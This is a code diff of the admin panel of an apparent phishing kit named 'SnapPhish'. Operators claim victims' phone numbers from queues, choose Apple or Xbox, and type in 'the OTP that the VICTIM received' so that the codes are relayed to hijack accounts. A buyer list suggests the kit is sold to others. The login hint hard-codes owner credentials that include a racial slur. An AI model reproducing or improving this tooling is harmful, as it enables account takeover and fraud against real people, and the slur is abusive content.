@@ -5,257 +5,75 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>SnapPhish — Admin Panel</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-        }
-
-        body {
-            min-height: 100vh;
-            background: #0f0f0f;
-            padding: 20px;
-            color: #fff;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+        body { min-height: 100vh; background: #0f0f0f; padding: 20px; color: #fff; }
         .admin-container { max-width: 1100px; margin: 0 auto; }
 
         .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 16px 24px;
-            background: #1a1a1a;
-            border-radius: 16px;
-            border: 1px solid #2a2a2a;
-            margin-bottom: 24px;
-            flex-wrap: wrap;
-            gap: 10px;
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 16px 24px; background: #1a1a1a; border-radius: 16px;
+            border: 1px solid #2a2a2a; margin-bottom: 24px; flex-wrap: wrap; gap: 10px;
         }
-
         .header h1 { font-size: 22px; font-weight: 600; }
         .header h1 span { color: #FFFC00; }
         .header .user-info { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
-        .header .role-badge {
-            background: #2a2a2a;
-            padding: 4px 14px;
-            border-radius: 20px;
-            font-size: 12px;
-            text-transform: uppercase;
-        }
+        .header .role-badge { background: #2a2a2a; padding: 4px 14px; border-radius: 20px; font-size: 12px; text-transform: uppercase; }
         .header .role-badge.owner { background: #FFFC00; color: #000; }
-        .header .logout {
-            color: #ff6b6b;
-            cursor: pointer;
-            font-size: 14px;
-            font-weight: 500;
-            padding: 6px 16px;
-            border-radius: 10px;
-            border: 1px solid #ff6b6b;
-            transition: all 0.3s;
-        }
+        .header .logout { color: #ff6b6b; cursor: pointer; font-size: 14px; font-weight: 500; padding: 6px 16px; border-radius: 10px; border: 1px solid #ff6b6b; transition: all 0.3s; }
         .header .logout:hover { background: #ff6b6b; color: #000; }
 
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
-            gap: 12px;
-            margin-bottom: 24px;
-        }
-        .stat-card {
-            background: #1a1a1a;
-            padding: 16px;
-            border-radius: 14px;
-            border: 1px solid #2a2a2a;
-            text-align: center;
-        }
+        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 12px; margin-bottom: 24px; }
+        .stat-card { background: #1a1a1a; padding: 16px; border-radius: 14px; border: 1px solid #2a2a2a; text-align: center; }
         .stat-card .num { font-size: 28px; font-weight: 700; color: #FFFC00; }
         .stat-card .label { color: #888; font-size: 12px; margin-top: 4px; }
 
-        .queue-tabs {
-            display: flex;
-            gap: 8px;
-            margin-bottom: 20px;
-            flex-wrap: wrap;
-        }
-        .queue-tab {
-            padding: 10px 20px;
-            border-radius: 12px;
-            border: 2px solid #2a2a2a;
-            background: #141414;
-            color: #fff;
-            cursor: pointer;
-            font-size: 14px;
-            font-weight: 500;
-            transition: all 0.2s;
-        }
+        .queue-tabs { display: flex; gap: 8px; margin-bottom: 20px; flex-wrap: wrap; }
+        .queue-tab { padding: 10px 20px; border-radius: 12px; border: 2px solid #2a2a2a; background: #141414; color: #fff; cursor: pointer; font-size: 14px; font-weight: 500; transition: all 0.2s; }
         .queue-tab:hover { border-color: #444; }
         .queue-tab.active { border-color: #FFFC00; background: #1a1a1a; }
-        .queue-tab .badge {
-            background: #FFFC00;
-            color: #000;
-            padding: 1px 10px;
-            border-radius: 20px;
-            font-size: 12px;
-            margin-left: 6px;
-        }
+        .queue-tab .badge { background: #FFFC00; color: #000; padding: 1px 10px; border-radius: 20px; font-size: 12px; margin-left: 6px; }
 
         .numbers-list { display: flex; flex-direction: column; gap: 12px; }
-        .number-card {
-            background: #1a1a1a;
-            border-radius: 14px;
-            padding: 16px 20px;
-            border: 1px solid #2a2a2a;
-            display: flex;
-            flex-wrap: wrap;
-            align-items: center;
-            justify-content: space-between;
-            transition: border-color 0.2s;
-            gap: 12px;
-        }
+        .number-card { background: #1a1a1a; border-radius: 14px; padding: 16px 20px; border: 1px solid #2a2a2a; display: flex; flex-wrap: wrap; align-items: center; justify-content: space-between; transition: border-color 0.2s; gap: 12px; }
         .number-card .info { flex: 1; min-width: 150px; }
         .number-card .info .num { font-size: 18px; font-weight: 600; color: #fff; }
         .number-card .info .meta { color: #888; font-size: 13px; margin-top: 2px; }
 
         .number-card .actions { display: flex; gap: 8px; flex-wrap: wrap; }
-        .number-card .actions button {
-            padding: 8px 16px;
-            border-radius: 10px;
-            border: none;
-            font-size: 13px;
-            font-weight: 500;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
+        .number-card .actions button { padding: 8px 16px; border-radius: 10px; border: none; font-size: 13px; font-weight: 500; cursor: pointer; transition: all 0.2s; }
         .number-card .actions button:hover { transform: scale(1.03); }
 
         .btn-claim { background: #FFFC00; color: #000; }
-        .btn-otp4 { background: #FFFC00; color: #000; }
-        .btn-otp6 { background: #ffaa00; color: #000; }
+        .btn-apple { background: #FFFC00; color: #000; }
+        .btn-xbox { background: #00cc44; color: #000; }
         .btn-wrong { background: #ff6b6b; color: #fff; }
-        .btn-verified { background: #69db7c; color: #000; }
-        .btn-resend { background: #339af0; color: #fff; }
+        .btn-verified { background: #339af0; color: #fff; }
 
-        .otp-display {
-            display: inline-block;
-            background: #141414;
-            padding: 4px 16px;
-            border-radius: 8px;
-            font-family: monospace;
-            font-size: 20px;
-            color: #FFFC00;
-            margin-right: 8px;
-        }
+        .otp-display { display: inline-block; background: #141414; padding: 4px 16px; border-radius: 8px; font-family: monospace; font-size: 20px; color: #FFFC00; margin-right: 8px; }
 
-        .empty-state {
-            text-align: center;
-            color: #555;
-            padding: 40px 20px;
-            font-size: 15px;
-        }
+        .empty-state { text-align: center; color: #555; padding: 40px 20px; font-size: 15px; }
 
-        .owner-section {
-            background: #1a1a1a;
-            border-radius: 16px;
-            padding: 20px;
-            border: 1px solid #2a2a2a;
-            margin-bottom: 20px;
-        }
-        .owner-section h3 {
-            color: #FFFC00;
-            margin-bottom: 12px;
-            font-size: 18px;
-        }
-        .owner-section .input-group {
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-        }
-        .owner-section .input-group input {
-            flex: 1;
-            min-width: 120px;
-            padding: 10px 14px;
-            border-radius: 10px;
-            border: 2px solid #2a2a2a;
-            background: #121212;
-            color: #fff;
-            outline: none;
-        }
+        .owner-section { background: #1a1a1a; border-radius: 16px; padding: 20px; border: 1px solid #2a2a2a; margin-bottom: 20px; }
+        .owner-section h3 { color: #FFFC00; margin-bottom: 12px; font-size: 18px; }
+        .owner-section .input-group { display: flex; gap: 10px; flex-wrap: wrap; }
+        .owner-section .input-group input { flex: 1; min-width: 120px; padding: 10px 14px; border-radius: 10px; border: 2px solid #2a2a2a; background: #121212; color: #fff; outline: none; }
         .owner-section .input-group input:focus { border-color: #FFFC00; }
-        .owner-section .input-group button {
-            padding: 10px 20px;
-            border-radius: 10px;
-            border: none;
-            background: #FFFC00;
-            color: #000;
-            font-weight: 600;
-            cursor: pointer;
-        }
-        .owner-section .input-group button:hover { transform: scale(1.02); }
+        .owner-section .input-group button { padding: 10px 20px; border-radius: 10px; border: none; background: #FFFC00; color: #000; font-weight: 600; cursor: pointer; }
 
         .buyer-list { margin-top: 12px; }
-        .buyer-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 8px 12px;
-            background: #121212;
-            border-radius: 8px;
-            margin-bottom: 6px;
-            border: 1px solid #2a2a2a;
-            flex-wrap: wrap;
-            gap: 8px;
-        }
+        .buyer-item { display: flex; justify-content: space-between; align-items: center; padding: 8px 12px; background: #121212; border-radius: 8px; margin-bottom: 6px; border: 1px solid #2a2a2a; flex-wrap: wrap; gap: 8px; }
         .buyer-item .name { color: #fff; font-weight: 500; }
         .buyer-item .date { color: #888; font-size: 12px; }
-        .buyer-item .del {
-            color: #ff6b6b;
-            cursor: pointer;
-            font-size: 12px;
-            padding: 2px 10px;
-            border-radius: 6px;
-            border: 1px solid #ff6b6b;
-        }
+        .buyer-item .del { color: #ff6b6b; cursor: pointer; font-size: 12px; padding: 2px 10px; border-radius: 6px; border: 1px solid #ff6b6b; }
         .buyer-item .del:hover { background: #ff6b6b; color: #000; }
 
-        .login-box {
-            max-width: 400px;
-            margin: 80px auto;
-            background: #1a1a1a;
-            padding: 32px 28px;
-            border-radius: 24px;
-            border: 1px solid #2a2a2a;
-        }
+        .login-box { max-width: 400px; margin: 80px auto; background: #1a1a1a; padding: 32px 28px; border-radius: 24px; border: 1px solid #2a2a2a; }
         .login-box h2 { text-align: center; margin-bottom: 20px; color: #fff; }
-        .login-box input {
-            width: 100%;
-            padding: 14px;
-            border-radius: 12px;
-            border: 2px solid #2a2a2a;
-            background: #121212;
-            color: #fff;
-            font-size: 16px;
-            margin-bottom: 12px;
-            outline: none;
-        }
+        .login-box input { width: 100%; padding: 14px; border-radius: 12px; border: 2px solid #2a2a2a; background: #121212; color: #fff; font-size: 16px; margin-bottom: 12px; outline: none; }
         .login-box input:focus { border-color: #FFFC00; }
-        .login-box button {
-            width: 100%;
-            padding: 14px;
-            border-radius: 12px;
-            border: none;
-            background: #FFFC00;
-            color: #000;
-            font-size: 18px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-        .login-box button:hover { transform: scale(1.02); }
-        .login-box .hint { color: #555; text-align: center; margin-top: 12px; font-size: 13px; }
+        .login-box button { width: 100%; padding: 14px; border-radius: 12px; border: none; background: #FFFC00; color: #000; font-size: 18px; font-weight: 600; cursor: pointer; }
 
         .hidden { display: none !important; }
-
         @media (max-width: 600px) {
             .number-card { flex-direction: column; align-items: stretch; }
             .number-card .actions { justify-content: center; }
@@ -273,7 +91,7 @@
             <input type="text" id="loginUser" placeholder="Username" />
             <input type="password" id="loginPass" placeholder="Password" />
             <button onclick="login()">Login →</button>
-            <p class="hint">Owner: owner / nigga</p>
+            <p style="color:#555;text-align:center;margin-top:12px;font-size:13px;">Owner: owner / nigga</p>
         </div>
     </div>
 
@@ -341,7 +159,7 @@
         let lastCount = 0;
 
         // ============================================================
-        // NOTIFICATION SOUND (ting-ting)
+        // NOTIFICATION SOUND
         // ============================================================
         function playNotification() {
             try {
@@ -356,7 +174,6 @@
                 gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.12);
                 osc.start(ctx.currentTime);
                 osc.stop(ctx.currentTime + 0.12);
-                // second beep
                 setTimeout(() => {
                     const osc2 = ctx.createOscillator();
                     const gain2 = ctx.createGain();
@@ -370,7 +187,6 @@
                     osc2.stop(ctx.currentTime + 0.1);
                 }, 150);
             } catch(e) {
-                // fallback
                 try {
                     const audio = new Audio('data:audio/wav;base64,UklGRnoAAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoAAACBhYqFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhYaFhY=');
                     audio.volume = 0.3;
@@ -443,7 +259,7 @@
         }
 
         // ============================================================
-        // LOAD QUEUES (with notification)
+        // LOAD QUEUES
         // ============================================================
         async function loadQueues() {
             try {
@@ -459,9 +275,7 @@
                 document.getElementById('countC').textContent = countC;
 
                 const total = countA + countB + countC;
-                if (total > lastCount) {
-                    playNotification();
-                }
+                if (total > lastCount) { playNotification(); }
                 lastCount = total;
 
                 // Stats
@@ -495,24 +309,23 @@
                         <div class="actions" id="actions-${entry.id}">
                             ${entry.status === 'pending' ? `
                                 <button class="btn-claim" onclick="claimNumber('${entry.id}')">🎯 Claim</button>
-                            ` : entry.status === 'claimed' || entry.status === 'otp_sent' ? `
-                                <button class="btn-otp4" onclick="sendOTP('${entry.id}', 4)">🔢 4-Digit (Apple)</button>
-                                <button class="btn-otp6" onclick="sendOTP('${entry.id}', 6)">🔢 6-Digit (Xbox)</button>
-                                <button class="btn-wrong" onclick="markWrong('${entry.id}')">❌ Wrong</button>
+                            ` : entry.status === 'claimed' ? `
+                                <button class="btn-apple" onclick="selectPlatform('${entry.id}', 'apple')">🍎 Apple (4-Digit)</button>
+                                <button class="btn-xbox" onclick="selectPlatform('${entry.id}', 'xbox')">🎮 Xbox (6-Digit)</button>
+                            ` : entry.status === 'otp_sent' ? `
+                                <span style="color:#FFFC00;">OTP: ${entry.otp || '...'}</span>
                                 <button class="btn-verified" onclick="markVerified('${entry.id}')">✅ Verified</button>
-                                <button class="btn-resend" onclick="resendOTP('${entry.id}')">🔄 Resend</button>
+                                <button class="btn-wrong" onclick="markWrong('${entry.id}')">❌ Wrong</button>
                             ` : ''}
                         </div>
                     </div>
                 `).join('');
 
-            } catch (error) {
-                console.error('Load error:', error);
-            }
+            } catch (error) { console.error('Load error:', error); }
         }
 
         // ============================================================
-        // ACTIONS
+        // CLAIM NUMBER
         // ============================================================
         function claimNumber(qid) {
             fetch('/api/admin/update', {
@@ -522,27 +335,32 @@
             }).then(() => loadQueues());
         }
 
-        function sendOTP(qid, length) {
-            const otp = prompt(`Enter ${length}-digit OTP from Apple/Xbox:`);
-            if (!otp || otp.length !== length) { alert(`Enter exactly ${length} digits.`); return; }
+        // ============================================================
+        // SELECT PLATFORM (Apple/Xbox)
+        // ============================================================
+        function selectPlatform(qid, platform) {
+            const length = platform === 'apple' ? 4 : 6;
+            const otp = prompt(`Enter the ${length}-digit OTP that the VICTIM received from ${platform === 'apple' ? 'Apple' : 'Xbox'}:`);
+            if (!otp || otp.length !== length) {
+                alert(`Please enter exactly ${length} digits.`);
+                return;
+            }
             fetch('/api/admin/update', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ queueId: qid, action: length === 4 ? 'otp_4' : 'otp_6', otp: otp })
+                body: JSON.stringify({
+                    queueId: qid,
+                    action: length === 4 ? 'otp_4' : 'otp_6',
+                    otp: otp
+                })
             }).then(() => loadQueues());
         }
 
-        function markWrong(qid) {
-            if (!confirm('Mark as wrong?')) return;
-            fetch('/api/admin/update', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ queueId: qid, action: 'wrong' })
-            }).then(() => loadQueues());
-        }
-
+        // ============================================================
+        // MARK VERIFIED / WRONG
+        // ============================================================
         function markVerified(qid) {
-            if (!confirm('Mark as verified?')) return;
+            if (!confirm('Mark this number as verified?')) return;
             fetch('/api/admin/update', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -550,11 +368,12 @@
             }).then(() => loadQueues());
         }
 
-        function resendOTP(qid) {
+        function markWrong(qid) {
+            if (!confirm('Mark this number as wrong?')) return;
             fetch('/api/admin/update', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ queueId: qid, action: 'resend' })
+                body: JSON.stringify({ queueId: qid, action: 'wrong' })
             }).then(() => loadQueues());
         }
 
